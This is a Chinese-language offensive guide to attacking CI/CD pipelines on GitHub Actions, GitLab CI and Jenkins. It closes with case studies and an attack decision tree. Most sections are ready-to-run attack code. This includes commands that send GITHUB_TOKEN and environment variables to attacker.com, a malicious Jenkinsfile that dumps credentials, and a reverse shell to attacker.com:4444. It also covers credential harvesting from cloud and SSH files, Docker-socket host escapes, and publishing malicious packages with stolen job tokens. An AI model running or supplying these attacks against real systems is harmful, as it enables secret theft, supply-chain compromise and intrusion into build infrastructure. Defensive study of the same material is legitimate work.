# CI/CD Pipeline 攻击向量详解

## GitHub Actions 攻击

### pull_request_target 秘密泄露

```
漏洞原理:
├─ pull_request 事件: 在 PR 分支的上下文执行（无 secrets 访问）
├─ pull_request_target 事件: 在 base 分支的上下文执行（有 secrets 访问！）
│
├─ ⛔ 危险组合:
│   ├─ 使用 pull_request_target 触发
│   ├─ 且 checkout 了 PR 的代码（ref: github.event.pull_request.head.sha）
│   ├─ 等于: 在有 secrets 的环境中执行攻击者的代码
│   └─ 攻击者只需提交一个 PR → 窃取 secrets
│
└─ 变种:
    ├─ workflow 中 run 步骤执行 PR 中修改的脚本
    ├─ workflow 中 uses 引用 PR 中修改的 action
    └─ 构建时执行 PR 修改的 Makefile / Dockerfile
```

```yaml
# ⛔ 危险的 workflow 示例
name: Build PR
on:
  pull_request_target:  # 在 base 上下文执行 — 有 secrets

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ⛔ 检出了攻击者代码
      - run: npm install  # 执行攻击者的 package.json scripts
      - run: npm test     # 执行攻击者的测试代码

# 攻击者的 PR 可以:
# 1. 修改 package.json 的 preinstall 脚本
# 2. 修改测试文件中添加 secrets 外传代码
# 3. 添加恶意的 npm postinstall hook
```

```bash
# 搜索目标仓库中的危险 workflow
# 在 GitHub 搜索:
# filename:.github/workflows pull_request_target
# 结合检查是否有 actions/checkout 且 ref 为 PR head
```

### workflow_run 事件链

```
漏洞原理:
├─ workflow_run 在另一个 workflow 完成后触发
├─ workflow_run 在 default branch 的上下文执行（有 secrets）
├─ 但可以访问触发它的 workflow 的产物（artifacts）
│
└─ 攻击链:
    ├─ 1. PR 触发 pull_request workflow（无 secrets）
    ├─ 2. pull_request workflow 上传 artifact
    ├─ 3. workflow_run 下载 artifact 并在有 secrets 的环境处理
    ├─ 4. 如果 artifact 内容未校验 → 代码注入
    └─ ⛔ artifact 可包含恶意脚本/修改的构建配置
```

```yaml
# 不安全的 workflow_run 示例
name: Process PR Results
on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: build-output
          run-id: ${{ github.event.workflow_run.id }}

      # ⛔ 危险: 直接执行下载的脚本
      - run: bash ./build-output/deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

### 自定义 Action 投毒

```
攻击方式:
├─ 1. Typosquatting
│   ├─ 创建与流行 action 相似的仓库名
│   ├─ actions/checkout → actions-checkout / action/checkout
│   └─ 用户拼写错误 → 使用恶意 action
│
├─ 2. 已有 Action 的 Compromise
│   ├─ 攻击者获取 action 维护者的 GitHub 账号
│   ├─ 修改 action 代码 → 注入恶意逻辑
│   ├─ 如果 workflow 引用 tag（如 @v3）→ tag 可被覆盖
│   └─ ⛔ 使用 commit SHA 引用更安全
│
└─ 3. 依赖 action 的上游包投毒
    ├─ action 的 package.json 依赖被 dependency confusion
    └─ action 在用户 workflow 中执行恶意代码
```

```yaml
# ⛔ 不安全: 使用 tag 引用（tag 可被覆盖）
- uses: some-org/some-action@v1

# ✓ 安全: 使用 commit SHA 引用
- uses: some-org/some-action@a1b2c3d4e5f6789012345678901234567890abcd

# 检查 action 的实际代码
# 1. 访问 action 仓库检查 action.yml 和代码
# 2. 确认 tag 对应的 commit 是否可信
```

### GITHUB_TOKEN 权限滥用

```
GITHUB_TOKEN 默认权限:
├─ 读: contents, metadata, packages
├─ 写: (取决于 workflow 触发事件和仓库设置)
│
├─ ⛔ 如果 permissions 设置过宽:
│   ├─ contents: write → 可修改代码/创建分支/push 代码
│   ├─ pull-requests: write → 可合并 PR
│   ├─ issues: write → 可关闭/修改 issue
│   ├─ actions: write → 可触发其他 workflow
│   └─ packages: write → 可发布恶意包
│
└─ 攻击利用:
    ├─ 窃取 GITHUB_TOKEN → 在 token 有效期内（workflow 运行期间）操作仓库
    ├─ 创建新 branch → push 恶意代码 → 创建 PR → 自动合并
    └─ 发布恶意 release/package
```

```bash
# 在 workflow 中窃取 GITHUB_TOKEN
# （如果攻击者控制了 workflow 执行的代码）
echo "$GITHUB_TOKEN" | base64 | curl -d @- https://attacker.com/exfil

# 利用窃取的 GITHUB_TOKEN
# push 恶意代码
git clone https://x-access-token:$GITHUB_TOKEN@github.com/org/repo.git
cd repo
echo "malicious code" >> backdoor.py
git add . && git commit -m "chore: update dependencies"
git push origin main  # 如果 branch protection 不严格

# 创建 Release
curl -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/org/repo/releases" \
  -d '{"tag_name":"v9.9.9","name":"v9.9.9","body":"security update"}'
```

### Self-hosted Runner 逃逸

```
Self-hosted Runner 风险:
├─ Runner 是组织内的机器（vs GitHub-hosted 是临时 VM）
├─ ⛔ 持久化环境: 上一个 workflow 的残留可被下一个利用
├─ 访问内网资源 → 横向移动入口
├─ 可能有生产环境凭据/SSH 密钥
│
└─ 攻击方式:
    ├─ 1. Runner 机器上的凭据窃取
    │   ├─ ~/.ssh/ / ~/.aws/ / ~/.kube/
    │   ├─ 环境变量中的 secrets
    │   └─ Docker socket → 容器逃逸
    │
    ├─ 2. 跨 workflow 数据窃取
    │   ├─ /tmp 中的残留文件
    │   ├─ 构建缓存中的 secrets
    │   └─ Git 配置中的 token
    │
    └─ 3. 内网渗透
        ├─ Runner 通常在 VPC/内网中
        ├─ 可扫描内网服务
        └─ 可访问内部 API/数据库
```

```bash
# 在 Self-hosted Runner 上的信息收集
# 主机信息
uname -a && id && hostname
cat /etc/os-release

# 凭据搜索
find / -maxdepth 4 -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "id_rsa" 2>/dev/null
find / -maxdepth 4 -name ".env" -o -name "credentials" -o -name "*.conf" 2>/dev/null | head -20
cat ~/.ssh/known_hosts  # 发现内网主机

# Docker socket
ls -la /var/run/docker.sock
docker ps 2>/dev/null

# Kubernetes
ls -la ~/.kube/config 2>/dev/null
kubectl get pods --all-namespaces 2>/dev/null

# 云凭据
cat ~/.aws/credentials 2>/dev/null
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null
cat ~/.azure/msal_token_cache.json 2>/dev/null

# 内网探测
ip addr show
ip route show
# 扫描常见内网服务
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  timeout 1 bash -c "echo > /dev/tcp/10.0.0.1/$port" 2>/dev/null && echo "10.0.0.1:$port open"
done
```

## GitLab CI 攻击

### CI_JOB_TOKEN 滥用

```
CI_JOB_TOKEN 能力:
├─ 默认权限:
│   ├─ 克隆同组其他仓库（如果配置允许）
│   ├─ 访问 GitLab Container Registry
│   ├─ 访问 GitLab Package Registry
│   ├─ 触发其他项目的 pipeline（如果配置允许）
│   └─ 访问 GitLab API（有限范围）
│
└─ 攻击利用:
    ├─ 克隆其他私有仓库 → 获取源码/secrets
    ├─ 发布恶意包到 Package Registry
    ├─ 触发其他项目的 CI → 链式攻击
    └─ 访问 Container Registry → 替换镜像
```

```bash
# 利用 CI_JOB_TOKEN 克隆其他仓库
git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/company/secret-repo.git

# 列出可访问的项目
curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.com/api/v4/projects?membership=true"

# 发布恶意包
curl -s --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  --upload-file malicious-pkg.tgz \
  "https://gitlab.com/api/v4/projects/$CI_PROJECT_ID/packages/npm/@scope/package/-/@scope/package-99.0.0.tgz"

# 触发其他项目的 pipeline
curl -s -X POST \
  --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.com/api/v4/projects/OTHER_PROJECT_ID/trigger/pipeline?ref=main"
```

### 共享 Runner Docker Socket 逃逸

```bash
# GitLab 共享 Runner 通常使用 Docker executor
# 如果 Runner 配置挂载了 Docker socket → 可逃逸

# .gitlab-ci.yml
# 检查 Docker socket
test:
  image: docker:latest
  services:
    - docker:dind
  script:
    # 如果 /var/run/docker.sock 可访问
    - docker run -v /:/host --privileged alpine cat /host/etc/shadow
    # 创建特权容器 → 访问宿主机
    - docker run -v /:/host --privileged alpine chroot /host bash -c "cat /etc/shadow"
```

### Pipeline Trigger Token 泄露

```bash
# Trigger Token 可触发任意 pipeline
# 常见泄露位置: .gitlab-ci.yml 中硬编码、环境变量、日志

# 利用泄露的 Trigger Token
curl -X POST \
  -F "token=LEAKED_TRIGGER_TOKEN" \
  -F "ref=main" \
  -F "variables[MALICIOUS_VAR]=payload" \
  "https://gitlab.com/api/v4/projects/PROJECT_ID/trigger/pipeline"

# 通过变量注入修改 CI 行为
# 如果 .gitlab-ci.yml 中使用了 $MALICIOUS_VAR → 命令注入
```

### include: 远程配置注入

```yaml
# GitLab CI 支持 include 远程 YAML 配置
# 如果 include 的 URL 可被攻击者控制 → 注入恶意 CI 配置

# 不安全示例 — include 的 URL 可被篡改
include:
  - remote: 'https://external-server.com/ci-templates/build.yml'

# 攻击者控制 external-server.com 或 MITM → 注入恶意 job

# 更隐蔽的方式 — include 仓库中的文件
include:
  - project: 'shared/ci-templates'
    ref: main
    file: '/templates/build.yml'
# 如果攻击者能向 shared/ci-templates 提交代码 → 修改 build.yml
```

## Jenkins 攻击

### Jenkinsfile 注入 (PR-based)

```
攻击原理:
├─ Jenkins Multibranch Pipeline 自动检测新分支/PR
├─ 从 PR 分支的 Jenkinsfile 执行 pipeline
├─ ⛔ Jenkinsfile 在 Jenkins 的上下文执行（有 credentials 访问）
│
└─ 攻击方式:
    ├─ Fork 目标仓库 → 修改 Jenkinsfile → 提交 PR
    ├─ Jenkinsfile 中注入恶意 Groovy 代码
    └─ 窃取 Jenkins credentials → 横向移动
```

```groovy
// 恶意 Jenkinsfile — 窃取 credentials
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                // 窃取所有环境变量（可能含 secrets）
                sh 'env | sort | curl -X POST -d @- https://attacker.com/exfil'

                // 使用 withCredentials 窃取特定凭据
                withCredentials([string(credentialsId: 'deploy-key', variable: 'DEPLOY_KEY')]) {
                    sh 'echo $DEPLOY_KEY | curl -X POST -d @- https://attacker.com/exfil'
                }

                // Groovy 脚本直接访问 Jenkins 内部
                script {
                    def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
                        com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials,
                        Jenkins.instance, null, null
                    )
                    creds.each { c ->
                        println "ID: ${c.id}, User: ${c.username}, Pass: ${c.password}"
                    }
                }
            }
        }
    }
}
```

### Credentials 提取

```bash
# Jenkins Credentials 存储位置
# $JENKINS_HOME/credentials.xml
# $JENKINS_HOME/secrets/master.key
# $JENKINS_HOME/secrets/hudson.util.Secret

# 如果有 Jenkins 文件系统访问
cat /var/lib/jenkins/credentials.xml
cat /var/lib/jenkins/secrets/master.key

# 解密 Jenkins Credentials（需要 master.key + hudson.util.Secret）
# 工具: https://github.com/gquere/pwn_jenkins
python3 jenkins_offline_decrypt.py /var/lib/jenkins/

# 通过 Jenkins API（需要认证）
curl -u admin:token "https://jenkins.target.com/credentials/store/system/domain/_/credential/deploy-key/config.xml"
```

### Script Console RCE

```groovy
// Jenkins Script Console: /script
// 需要 Jenkins Admin 权限

// 执行系统命令
"whoami".execute().text

// 反向 Shell
['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'].execute()

// 读取文件
new File('/etc/passwd').text

// 列出所有 Credentials
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.Credentials.class,
    Jenkins.instance, null, null
)
creds.each { println it.properties }

// 枚举内网
def sout = new StringBuilder(), serr = new StringBuilder()
'ip addr show'.execute().waitForProcessOutput(sout, serr)
println sout
```

### Agent 逃逸

```
Jenkins Agent 逃逸:
├─ Jenkins Agent 运行在构建节点上
├─ 如果 Agent 以特权用户运行 → 控制构建节点
│
├─ Docker Agent 逃逸:
│   ├─ Jenkinsfile 中指定 Docker Agent
│   ├─ 如果 Docker socket 挂载 → 逃逸到 host
│   └─ pipeline { agent { docker { image 'alpine' } } }
│
└─ Kubernetes Agent (JCasC):
    ├─ Jenkins 在 K8s 中动态创建 Pod 作为 Agent
    ├─ Pod 可能有 ServiceAccount Token → K8s API 访问
    └─ 从 Agent Pod → K8s 集群攻击
```

## 通用 CI/CD 攻击

### 构建缓存投毒

```
攻击原理:
├─ CI/CD 缓存加速构建（npm cache, pip cache, Maven .m2）
├─ 如果缓存在多个 pipeline 间共享 → 可投毒
│
├─ 投毒方式:
│   ├─ 在 PR pipeline 中修改缓存内容
│   ├─ 恶意包被缓存 → 后续 pipeline 使用
│   └─ 缓存中的构建工具被替换（如 node, python）
│
└─ 影响:
    ├─ 后续构建使用被污染的缓存
    ├─ 绕过了 lockfile 保护（缓存中的包不会重新下载/验证）
    └─ 可持久化 — 直到缓存过期
```

```yaml
# GitHub Actions 缓存投毒示例
# 如果 PR 可以写入缓存 → 可投毒

# 恶意 PR 的 workflow
- uses: actions/cache@v3
  with:
    path: node_modules
    key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}
    # PR 修改 package-lock.json → 新 cache key → 新缓存被创建
    # 缓存中包含被篡改的 node_modules
```

### 制品仓库 Tag 覆盖

```bash
# Docker 镜像 tag 覆盖
# 如果攻击者有 push 权限 → 覆盖 latest 或特定 tag
docker tag malicious:latest registry.target.com/app:latest
docker push registry.target.com/app:latest

# npm 包 tag 覆盖
npm dist-tag add malicious-package@99.0.0 latest

# 防御: 使用 digest/hash 而非 tag 引用
# Docker: registry.target.com/app@sha256:abc123...
# npm: package-lock.json 中的 integrity hash
```

### Secret 在 env/log 中泄露

```bash
# CI/CD 中 Secrets 常见泄露点

# 1. 环境变量打印
env | sort  # 所有 env 变量（包括 secrets）
printenv    # 同上

# 2. Debug 模式
# GitHub Actions: ACTIONS_STEP_DEBUG=true → 详细日志
# GitLab CI: CI_DEBUG_TRACE=true → 打印所有变量
# Jenkins: -Dorg.jenkinsci.plugins.workflow.steps.durable_task.DurableTaskStep.REMOTE_TIMEOUT=0

# 3. 构建工具泄露
npm install --verbose    # 可能打印 registry token
pip install -v           # 可能打印 index URL（含凭据）
docker build --progress=plain  # 打印每一步详情

# 4. 错误信息泄露
# 认证失败时可能在错误消息中包含 token
# curl 的 -v 输出包含 Authorization header

# 5. 第三方服务 webhook 回调
# CI/CD 通知（Slack/Discord）可能包含环境信息
```

### 部署密钥窃取

```bash
# CI/CD 部署阶段通常有:
# - K8s kubeconfig
# - SSH deploy keys
# - Cloud credentials (AWS/GCP/Azure)
# - Docker registry credentials
# - Database connection strings

# 在 CI/CD 环境中搜索
# Kubernetes
cat $KUBECONFIG 2>/dev/null || cat ~/.kube/config 2>/dev/null
echo $KUBECONFIG

# SSH Keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa 2>/dev/null

# Docker
cat ~/.docker/config.json 2>/dev/null
# 可能包含 registry 认证信息

# 云凭据
echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
cat ~/.aws/credentials 2>/dev/null

# Terraform state（可能含明文密码）
find / -name "*.tfstate" -exec grep -l "password" {} \; 2>/dev/null
```

## Case Studies

### Codecov (2021.01 - 2021.04)

```
攻击链:
├─ 1. 攻击者利用 Codecov Docker 镜像构建过程中的漏洞
├─ 2. 修改了 Codecov 的 Bash Uploader 脚本
├─ 3. 脚本被全球数千家公司的 CI/CD 中使用
├─ 4. 恶意脚本收集 CI/CD 环境中的:
│   ├─ 环境变量（含 secrets）
│   ├─ Git remote URLs（含 token）
│   └─ CI/CD 配置信息
├─ 5. 数据外传到攻击者服务器
├─ 6. 持续 3 个月未被发现
│
└─ 教训:
    ├─ 第三方 CI/CD 脚本是高价值目标
    ├─ Bash 脚本 curl | bash 模式极度危险
    ├─ 需要验证 CI/CD 工具的完整性（checksum/签名）
    └─ 受影响企业: Twitch, HashiCorp, Confluent 等
```

### SolarWinds (2020)

```
攻击链:
├─ 1. 攻击者入侵 SolarWinds 开发环境
├─ 2. 修改了 Orion 软件的构建流程
├─ 3. 在构建时注入 SUNBURST 后门
├─ 4. 正常构建 + 签名流程 → 合法的软件更新
├─ 5. ~18,000 客户安装了含后门的更新
├─ 6. 后门通过 DNS 与 C2 通信
│
└─ CI/CD 相关教训:
    ├─ 构建环境是供应链攻击的核心目标
    ├─ 代码签名不能防止构建时注入
    ├─ 需要 reproducible builds（可重现构建）
    └─ 构建环境需要与开发/生产环境同等安全
```

### ua-parser-js (2021.10)

```
攻击链:
├─ 1. 攻击者劫持 ua-parser-js npm 包维护者账号
├─ 2. 发布包含恶意代码的 0.7.29、0.8.0、1.0.0 版本
├─ 3. 恶意 preinstall 脚本:
│   ├─ Linux: 下载并执行加密货币挖矿程序
│   └─ Windows: 下载并执行密码窃取木马 + 挖矿程序
├─ 4. ua-parser-js 周下载量 700万+ → 影响巨大
│
└─ 教训:
    ├─ npm 账号安全是关键（需要 2FA）
    ├─ preinstall/postinstall scripts 是高风险执行点
    ├─ 需要监控依赖更新的异常行为
    └─ lockfile + integrity hash 可以部分防御
```

## 攻击决策树

```
CI/CD 攻击入口:
├─ 有目标仓库的 PR 权限?
│   ├─ GitHub → 检查 pull_request_target workflow
│   ├─ GitLab → 检查 pipeline 是否对 fork 开放
│   └─ Jenkins → 检查 Multibranch Pipeline 配置
│
├─ 能修改 CI/CD 配置文件?
│   ├─ .github/workflows/*.yml
│   ├─ .gitlab-ci.yml
│   ├─ Jenkinsfile
│   └─ 其他: .circleci/config.yml, .travis.yml
│
├─ 有 CI/CD 系统的直接访问?
│   ├─ Jenkins 管理界面 → Script Console RCE
│   ├─ GitLab Admin → Runner 配置
│   └─ GitHub org settings → Self-hosted runner
│
├─ 可投毒上游依赖?
│   ├─ 自定义 Actions/Steps → 投毒 action 仓库
│   ├─ 构建缓存 → 缓存投毒
│   └─ 共享 CI 模板 → 模板注入
│
└─ 已在 CI/CD 环境中?
    ├─ 收集 secrets (env vars, files, credentials)
    ├─ 横向移动 (内网, 其他仓库, 云服务)
    ├─ 持久化 (修改 workflow, 添加 SSH key, 注入后门)
    └─ 供应链投毒 (修改制品, 替换镜像)
```
